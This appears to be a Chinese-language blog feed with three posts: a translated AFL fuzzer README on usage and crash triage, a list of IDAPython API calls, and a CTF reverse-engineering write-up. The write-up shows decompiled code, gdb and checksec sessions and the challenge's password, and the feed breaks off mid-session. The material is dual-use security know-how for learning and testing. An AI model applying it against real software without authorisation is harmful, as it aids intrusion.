title="5）选择初始化测试用例"></a>5）选择初始化测试用例</h3><p>要正确操作，fuzzer需要一个或多个启动文件，其中包含目标应用程序通常期望的输入数据的良好示例。有两个基本规则：</p><blockquote><ol><li>保持文件小。1 kB以下是理想的，尽管不是严格必需的。有关为什么尺寸很重要的讨论，请参阅perf tips.txt。</li><li>只有当多个测试用例在功能上不同时，才使用它们。使用50张不同的度假照片来模糊一个图片库是没有意义的。</li></ol></blockquote><p>你可以在AFL的安装目录<code>testcases/subdirectory</code>下找到许多很好的启动文件例子。</p><p>注：如果有大量数据可用来进行筛选，那么您可能希望使用<code>afl-cmin</code>实用程序来标识功能不同的文件子集，这些文件在目标二进制文件中执行不同的代码路径。</p><h3 id="6）模糊测试二进制文件"><a href="#6）模糊测试二进制文件" class="headerlink" title="6）模糊测试二进制文件"></a>6）模糊测试二进制文件</h3><p>模糊过程本身是由afl-fuzz实用程序执行的。这个程序需要一个带有初始测试用例的只读目录，一个单独的地方来存储它的结果，加上要测试的二进制文件的路径。</p><p>对于直接接受stdin输入的目标二进制文件，通常的语法是：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [...params...]</span><br></pre></td></tr></table></figure></blockquote><p>对于从文件中获取输入的目标二进制文件，使用‘@@’来标记目标命令行中应该放置输入文件名的位置。然后模糊器会自动为你替换：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure></blockquote><p>还可以使用-f选项将变化后的数据写入特定文件。如果程序需要一个特定的文件扩展名，这很有用。</p><p>可以在QEMU模式(在命令行中添加-Q)或在传统的盲模糊模式(指定-n)中对未插桩的二进制文件进行模糊处理。</p><p>您可以使用-t和-m来覆盖所执行进程的默认超时和内存限制;需要修改这些设置的少数目标包括编译器和视频解码器。</p><p>在perf_tips .txt中讨论了优化模糊性能的技巧。</p><p>请注意，afl-fuzz首先执行一组确定性模糊步骤，这可能要花费<strong>几天时间</strong>，但往往会生成整洁的测试用例。如果你想马上得到快捷而又不太好的结果——类似于zzuf和其他传统的模糊器——在命令行中添加-d选项。</p><h3 id="7）看懂输出的含义"><a href="#7）看懂输出的含义" class="headerlink" title="7）看懂输出的含义"></a>7）看懂输出的含义</h3><p>有关如何解释显示的统计信息和监视进程的运行状况的信息，请参阅status_screen.txt文件。一定要参考这个文件，特别是当任何UI元素用红色突出显示时。</p><p>模糊过程会一直执行，直到您按下Ctrl-C。您至少希望允许fuzzer完成一个队列周期，这可能需要几个小时到一周左右的时间。</p><p>在输出目录中创建了三个子目录并实时更新：</p><blockquote><ol><li>queue/  每个不同的执行路径的测试用例，加上用户给出的所有启动文件。这是第二节中提到的合成语料库; 在将此语料库用于任何其他目的之前，可以使用afl-cmin工具将其缩小到更小的大小。该工具将找到提供等效边缘覆盖的更小的文件子集。</li><li>crashes/  导致被测试程序接收到一个致命的信号的唯一测试用例(例如，SIGSEGV, SIGILL, SIGABRT)。条目根据接收到的信号进行分组。</li><li>hangs/   导致被测试程序超时的唯一测试用例。在某些东西被归类为挂起之前的默认时间限制是较大的1秒和-t参数的值。该值可以通过设置AFL_HANG_TMOUT进行微调，但这很少是必要的。</li></ol></blockquote><p>如果相关的执行路径包含以前记录的错误中没有的任何状态转换，那么崩溃和挂起被认为是“唯一的”。如果一个bug可以通过多种方式达到，那么在早期会出现一些计数膨胀，但这种情况应该很快就会消失。</p><p>崩溃和挂起的文件名与父的、无故障的队列条目相关。这应该有助于调试。</p><p>当您不能重现afl-fuzz发现的崩溃时，最有可能的原因是您没有设置与该工具所使用的相同的内存限制。可以尝试修改以下设置：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ LIMIT_MB=50</span><br><span class="line">$ ( <span class="built_in">ulimit</span> -Sv $[LIMIT_MB &lt;&lt; <span class="string">10]; /path/to/tested_binary ... )</span></span><br></pre></td></tr></table></figure></blockquote><p>更改LIMIT_MB以匹配传递给afl-fuzz的-m参数。 在OpenBSD上，还将-Sv更改为-Sd。</p><p>还可以使用任何现有的输出目录恢复中止的作业。以下：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i- -o existing_output_dir [...etc...]</span><br></pre></td></tr></table></figure></blockquote><p>如果安装了gnuplot，则还可以使用afl-plot为任何正在进行活动的模糊测试任务生成漂亮的图形。 举例来说，参见<a href="http://lcamtuf.coredump.cx/afl/plot/%E3%80%82">http://lcamtuf.coredump.cx/afl/plot/。</a></p><h3 id="8）并行模糊测试"><a href="#8）并行模糊测试" class="headerlink" title="8）并行模糊测试"></a>8）并行模糊测试</h3><p>afl-fuzz的每个实例大约占一个核心。这意味着在多核系统上，为了充分利用硬件，必须进行并行。有关如何在多个核或多个联网机器上模糊一个公共目标的技巧，请参阅parallel_fuzzing.txt。</p><p>并行模糊模式也提供了一种简单的方法来连接AFL到其他模糊器，符号或共混执行引擎等等; 同样，请参阅parallel_fuzzing.txt的最后一节以获得提示。</p><h3 id="9）模糊器字典"><a href="#9）模糊器字典" class="headerlink" title="9）模糊器字典"></a>9）模糊器字典</h3><p>默认情况下，afl-fuzz突变引擎针对紧凑的数据格式进行了优化——例如，图像、多媒体、压缩数据、正则表达式语法或shell脚本。它不太适合那些特别冗长和冗余的语言——尤其是HTML、SQL或JavaScript。</p><p>为了避免构建语法感知工具的麻烦，afl-fuzz提供了一种方法，为模糊处理过程提供一个可选的字典，其中包含语言关键字、魔法头或与目标数据类型相关联的其他特殊标记，并使用它们在运行中重构底层语法（参阅：<a href="http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html%EF%BC%89%E3%80%82">http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html）。</a></p><p>要使用此功能，您首先需要在两者之一中创建字典dictionaries/README.dictionaries中讨论的格式； 然后通过命令行中的-x选项将模糊器指向它。（在该子目录中也提供了一些常用字典。）</p><p>没有办法提供底层语法的更结构化的描述，但是fuzzer可能仅基于插装反馈就能找出其中的一部分。这在实践中是可行的，参阅：<a href="http://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html%E3%80%82">http://lcamtuf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.html。</a></p><p>注：即使没有给出显式字典，afl-fuzz也会通过在确定的字节翻转期间非常密切地观察插装，尝试从输入语料库中提取现有语法标记。这种方法适用于某些类型的解析器和语法，但不如-x模式好。</p><p>如果真的很难获得字典，另一种选择是让AFL运行一段时间，然后使用AFL随附的令牌捕获库。 为此，请参见libtokencap / README.tokencap。</p><h3 id="10）崩溃分组"><a href="#10）崩溃分组" class="headerlink" title="10）崩溃分组"></a>10）崩溃分组</h3><p>基于覆盖率的崩溃分组通常会生成一个小数据集，可以手动或使用非常简单的GDB或Valgrind脚本快速筛选该数据集。每个崩溃都可以追溯到队列中的父非崩溃测试用例，从而更容易诊断错误。</p><p>话虽如此，重要的是要承认，如果没有大量的调试和代码分析工作，一些模糊崩溃很难快速评估可利用性。为了帮助完成这个任务，afl-fuzz支持一个非常独特的“崩溃探索”模式，启用了-C标志。</p><p>在这种模式下，fuzzer将一个或多个崩溃测试用例作为输入，并使用它的反馈驱动的模糊策略来非常快速地枚举程序中可以到达的所有代码路径，同时保持程序处于崩溃状态。</p><p>不会导致崩溃的突变被排斥;也不会影响执行路径的更改。</p><p>输出是一个小的文件语料库，可以非常快速地检查这些文件，以查看攻击者对错误地址的控制程度，或者是否有可能通过初始越界读取——并查看下面隐藏的内容。</p><p>对于测试用例最小化，尝试一下afl-tmin。这个工具操作起来很简单：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-tmin -i test_case -o minimized_result -- /path/to/program [...]</span><br></pre></td></tr></table></figure></blockquote><p>该工具对崩溃和非崩溃测试用例同样有效。在崩溃模式下，它将愉快地接受检测和非检测的二进制文件。在非崩溃模式下，最小化器依靠标准的AFL插桩来简化文件，而不改变执行路径。</p><p>另一个最近添加到AFL的是AFL分析工具。它接受一个输入文件，尝试按顺序翻转字节，并观察被测试程序的行为。然后，它根据哪些部分看起来是关键的，哪些不是关键的，对输入进行颜色编码;虽然不是很完善，但它通常可以提供对复杂文件格式的快速洞察。更多关于其操作的信息可以在technical_details.txt结尾找到。</p><h3 id="11）崩溃以外"><a href="#11）崩溃以外" class="headerlink" title="11）崩溃以外"></a>11）崩溃以外</h3><p>在发现非崩溃设计和错误实现方面，Fuzzing也是一种很棒但未被充分利用的技术。通过修改目标程序来调用abort()，可以发现很多有趣的错误：</p><blockquote><ol><li>当给定相同的模糊生成的输入时，两个bignum库会产生不同的输出</li><li>当要求连续解码相同的输入图像时，图像库产生不同的输出</li><li>当迭代序列化和反序列化模糊器提供数据时,序列化/反序列化库无法产生稳定的输出</li><li>当要求压缩和解压特定blob时，压缩库生成与输入文件不一致的输出</li></ol></blockquote><p>实现这些或类似的健全检查通常只需要很少的时间;如果你是一个特定包的维护者，你可以使用#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION(libfuzzer也有的标志)或#ifdef __AFL_COMPILER(仅针对AFL)。</p><h3 id="12）通有风险"><a href="#12）通有风险" class="headerlink" title="12）通有风险"></a>12）通有风险</h3><p>请记住，与许多其他计算密集型任务类似，模糊测试可能会给硬件和操作系统带来压力。特别是以下几点：</p><blockquote><ol><li>你的CPU会很热，需要适当的冷却。在大多数情况下，如果冷却不足或停止正常工作，CPU速度将自动节流。也就是说，特别是在不太合适的硬件(笔记本电脑、智能手机等)上发出信号时，爆炸也不是完全不可能的；</li><li>目标程序最终可能会不规律地攫取千兆字节的内存或用垃圾文件填充磁盘空间。AFL试图加强基本的内存限制，但不能防止每一个可能的事故。底线是您不应该在数据丢失的可能性不是可接受的风险的系统上混淆。</li><li>模糊测试涉及对文件系统的数十亿次读取和写入。在现代系统中，这通常会被大量缓存，从而导致适度的物理I/O压力，但是也有很多因素改变这个压力值。因此你应该注意到这个潜在的故障，在物理I/O压力很大的情况下，可能会缩短许多HDD和SDD的寿命。</li></ol></blockquote><p>Linux系统上监视磁盘I/O情况的一个好用的命令是<code>iostat</code>(I/O STATE):</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iostat -d 3 -x -k [...optional disk ID...]</span><br></pre></td></tr></table></figure></blockquote><h3 id="13）已知的缺陷和需要改进的地方"><a href="#13）已知的缺陷和需要改进的地方" class="headerlink" title="13）已知的缺陷和需要改进的地方"></a>13）已知的缺陷和需要改进的地方</h3><p>这里有一些对AFL最重要的注意事项：</p><blockquote><ol><li><p>AFL通过检查第一个衍生进程因信号(SIGSEGV, SIGABRT等)而死亡来检测错误。为这些信号安装自定义处理程序的程序可能需要注释掉相关代码。同样，模糊目标产生的子进程中的错误可能会逃避检测，除非您手动添加一些代码来捕获它。</p></li><li><p>与任何其他暴力工具一样，如果使用加密、校验和、加密签名或压缩来完全包装待测试的实际数据格式，则fuzzer提供有限的覆盖范围。</p><p>要解决这个问题，你可以注释掉相关的检查（参阅安装目录下 experimental/libpng_no_checksum/）；如果不行，你也可以写一个后处理器（postprocessor），关于什么是后处理器参阅：experimental/post_library/。</p></li><li><p>不幸的是，AFL对于ASAN文件和64位二进制文件有一些取舍，这不是因为afl-fuzz的某些特定故障。参阅notes_for_asan.txt。</p></li><li><p>afl-fuzz并没有提供支持模糊测试的网络服务程序，后台守护程序或需要UI交互才能工作的交互式应用程序。你可以进行简单的代码修改，使其变得更为传统。Preeny也可能提供了一个相对简单的选项，参阅：<a href="https://github.com/zardus/preeny%E3%80%82">https://github.com/zardus/preeny。</a></p><p>修改基于网络的服务的一些有用提示也可以在这里看到：<a href="https://www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop%E3%80%82">https://www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop。</a></p></li><li><p>AFL不输出人类可读的覆盖率数据。如果你想监控覆盖率，请使用Michael Rash的afl-cov：<a href="https://github.com/mrash/afl-cov%E3%80%82">https://github.com/mrash/afl-cov。</a></p></li><li><p>有时sentient machines会反抗它们的创造者。（这里我看原文也真看不懂了，sentient machines好像是指专门研究real AI的一个名词）如果发生在你身上，请查看：<a href="http://lcamtuf.coredump.cx/prep/%E3%80%82">http://lcamtuf.coredump.cx/prep/。</a></p></li></ol></blockquote><p>除此之外，请参阅：INSTALL for platform-specific tips.</p><h3 id="14）特别鸣谢"><a href="#14）特别鸣谢" class="headerlink" title="14）特别鸣谢"></a>14）特别鸣谢</h3><p>……</p><h3 id="15）联系"><a href="#15）联系" class="headerlink" title="15）联系"></a>15）联系</h3><p><a href="mailto:&#x6c;&#x63;&#x61;&#x6d;&#x74;&#117;&#x66;&#64;&#x67;&#x6f;&#x6f;&#x67;&#108;&#101;&#x2e;&#99;&#x6f;&#109;">&#x6c;&#x63;&#x61;&#x6d;&#x74;&#117;&#x66;&#64;&#x67;&#x6f;&#x6f;&#x67;&#108;&#101;&#x2e;&#99;&#x6f;&#109;</a><br><a href="mailto:&#x61;&#x66;&#x6c;&#x2d;&#117;&#115;&#x65;&#114;&#115;&#x2b;&#115;&#117;&#98;&#x73;&#99;&#114;&#105;&#98;&#101;&#x40;&#103;&#x6f;&#111;&#103;&#108;&#101;&#103;&#x72;&#x6f;&#x75;&#112;&#x73;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x66;&#x6c;&#x2d;&#117;&#115;&#x65;&#114;&#115;&#x2b;&#115;&#117;&#98;&#x73;&#99;&#114;&#105;&#98;&#101;&#x40;&#103;&#x6f;&#111;&#103;&#108;&#101;&#103;&#x72;&#x6f;&#x75;&#112;&#x73;&#x2e;&#99;&#x6f;&#109;</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础概念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDAPython常用API整理</title>
      <link href="2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/"/>
      <url>2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="IDAPython常用API介绍："><a href="#IDAPython常用API介绍：" class="headerlink" title="IDAPython常用API介绍："></a>IDAPython常用API介绍：</h3><ul><li>通过一些脚本和《IDA Pro权威指南》，查阅官网的IDAPython API整理</li></ul><p>idaapi.MinEA()：获取载入程序的最小的有效地址</p><p>idaapi.MaxEA()：获取载入的程序最大的有效地址</p><p>idaapi.get_inf_structure()：获取当前打开的IDA的版本的信息，返回的是一个结构体，貌似是idainfo。</p><p><img src="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/image-20200215165904658.png" alt="image-20200215165904658"></p><p>idainfo.is_32bit(), idainfo.is_64bit()：判断IDA是32位的还是64位的，也就是可以通过上面的接口获取再调用，直接<code>import idainfo</code>是没有用的。</p><p>idaapi.Assemble(head, line)：从head地址开始反汇编，寻找直到遇到line这条指令时停止，返回两个变量，一个表示是否成功，另外一个是最后这条line指令的字节表示，例如：<code>ret</code>就会是<code>&#39;\xc3&#39;</code>这一个字节来表示，有些指令可能由多个字节表示。</p><p>idaapi.GetMnem(addr)：获取addr地址处的指令。</p><p>idaapi.MakeCode(addr)：从addr地址开始尝试将数据转换为汇编代码。</p><p>idaapi.next_not_tail(addr)：往下走一个指令，如果不是尾部，则返回下一条指令的起始地址。</p><p>idaapi.GetDisasm(addr)：获取addr地址开始的一条汇编指令。</p><p>idaapi.GetFlags(addr)：获取addr地址处的一系列标志位，可用来判断属于code还是data。</p><p>idaapi.isCode(Flags)：通过Flags判断是否是汇编代码。</p><p>idaapi.MakeUnkn(addr, size)：取消对addr地址处的size大小的定义，暂不清楚该地址是代码还是数据时可以使用。</p><p>idaapi.GetOpnd(addr, index)：取addr地址处的指令的第index个操作数，从零开始，从左开始，依次为intel汇编语法中的目的操作数、源操作数。</p><p>idaapi.get_name_ea(min_ea, name)：从min_ea地址开始，寻找名为name的有效地址，该name可以为函数名、label名。</p><p>idaapi.get_dword(addr)：从addr地址处获取一个dword数据。</p><p>idaapi.MakeDword(addr)：将addr开始的一个DWORD大小的数据定义为双字形式，举一反三，Q代表四字节数据，API形式一致。</p><p>idaapi.Segname(addr)：得到addr地址所处的区段名。</p><p>idaapi.MakeFunction(addr)：将addr地址处定义为一个函数，相当于快捷键<code>P</code>。</p><p>BADADDR: 常量，代表错误的地址。</p><p>idaapi.GetSpd(addr)：获取addr地址处的栈指针SP的值，而在IDA中显示的值则是SP到BP基址针的差值，例如获取到的值为<code>-4</code>,在IDA中显示栈指针的情况时则为4。</p><p><img src="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/image-20200215184320248.png" alt="image-20200215184320248"></p><p><img src="/2020/02/15/IDAPython%E5%B8%B8%E7%94%A8API%E6%95%B4%E7%90%86/image-20200215184345189.png" alt="image-20200215184345189"></p><p>idaapi.SetSpDiff(addr, diff)：设置addr地址处的Sp指针与Bp指针的差值，在平衡堆栈时需要用到。</p><p>idaapi.next_head(head, BADADDR)：遍历下一条指令，除非遇到BADADDR，返回下一条指令的地址。</p><p>idaapi.ua_mnem(addr)：返回addr地址处的指令类型。</p><p>idaapi.MakeName(addr, ‘’)：给addr地址处一个标记label。</p><p>FindFuncEnd(ea): ea为函数的起始地址，找到该函数的结尾地址并返回。</p><hr><h4 id="新编："><a href="#新编：" class="headerlink" title="新编："></a>新编：</h4><p>根据《The Beginners’ Guide to IDAPython》整理。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDAPython </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BambooFox-Move or not详解</title>
      <link href="2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="BambooFox-“Move-or-not”详解"><a href="#BambooFox-“Move-or-not”详解" class="headerlink" title="BambooFox-“Move or not”详解"></a>BambooFox-“Move or not”详解</h3><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>主要想讲讲通过这道题学到的东西，看完这篇文章，你可以：</p><ul><li>一般逆向题的静态分析技术；</li><li>Windows上IDA结合Linux虚拟机远程动态调试技术；</li><li>Linux上初级<code>expect</code>编程技术</li><li><code>ltrace</code>动态调试技术（更适合这道题）</li></ul><p>题目描述：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102145536953.png" alt="des"></p><h4 id="2-静态分析"><a href="#2-静态分析" class="headerlink" title="2.静态分析"></a>2.静态分析</h4><p>题目给了一个文件<code>pro</code>,使用<code>file</code>命令查看文件格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ file pro</span><br><span class="line">pro: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=7bfce31b622a4e5bd9db43154888a3e1891ccac9, stripped</span><br><span class="line">spwpun@ubuntu:~/Documents/20200102$ </span><br></pre></td></tr></table></figure><p>是一个ELF64位文件，在Linux虚拟机下执行该文件，首先需要输入password，随便输入之后验证错误就结束了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ ./pro</span><br><span class="line">First give me your password: 2312</span><br><span class="line">You don<span class="string">&#x27;t know static analysis !</span></span><br><span class="line"><span class="string">spwpun@ubuntu:~/Documents/20200102$ </span></span><br></pre></td></tr></table></figure><p>提示需要静态分析，使用IDA64位打开，程序没有混淆，在反编译后的main函数中很容易就能看清楚程序的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First give me your password: &quot;</span>, a2, a3);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">98416</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t know static analysis !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Second give me your key: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  v4 -= <span class="number">49</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;loc_201020 + i) += v4;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *))loc_201020)(s1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Then Verify your flag: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, &amp;s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are right. Congratulations !!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t know dynamic analysis !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说，程序的逻辑如下：</p><ol><li>首先获取用户输入，验证password</li><li>然后继续获取用户输入，验证key</li><li>key减去49得到新的key</li><li>修改<code>loc_201020</code>处的前11个字节的数据，在原始的数据上加上新的key的值</li><li>然后把<code>loc_201020</code>当做函数来执行，参数为<code>s1</code>，应该是修改<code>s1</code>的内容</li><li>再次获取用户输入，验证flag值</li><li>最后比较输入的flag和s1，相同则验证成功</li></ol><p>从上面的反编译伪代码中可以很容易知道password的值为<code>98416</code>,  但是<code>key</code>的值却不知道。貌似<code>key</code>是为了解码出正确的函数，然后利用该函数再解码真正的flag：<code>s1</code>，下面我使用动态调试来验证一下。</p><h4 id="3-动态调试"><a href="#3-动态调试" class="headerlink" title="3.动态调试"></a>3.动态调试</h4><h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h5><p>首先在IDA中查看<code>main</code>函数的地址，下图中为<code>0x00000000000007FA</code>：</p><p><img src="/2020/01/02/BambooFox-Move-or-not%E8%AF%A6%E8%A7%A3/image-20200102153118458.png" alt="image-20200102153118458"></p><p>看上去这个地址是有点奇怪，暂时不管，先用gdb试试。</p><p>使用gdb启动该程序，设置断点，然后执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">spwpun@ubuntu:~/Documents/20200102$ gdb ./pro</span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">Reading symbols from ./pro...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ b *0x7fa</span><br><span class="line">Breakpoint 1 at 0x7fa</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/spwpun/Documents/20200102/pro </span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint 1.</span><br><span class="line">Cannot access memory at address 0x7fa</span><br><span class="line"></span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p>上面的代码中提示不能设置断点，因为内存地址不可用。原来是地址随机化保护，以为是逆向题就没在意这个，使用<code>checksec</code>命令查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec pro</span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p>果然开启了PIE。不设断点，直接执行，输入password和key之后，程序会报段错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/spwpun/Documents/20200102/pro </span><br><span class="line">First give me 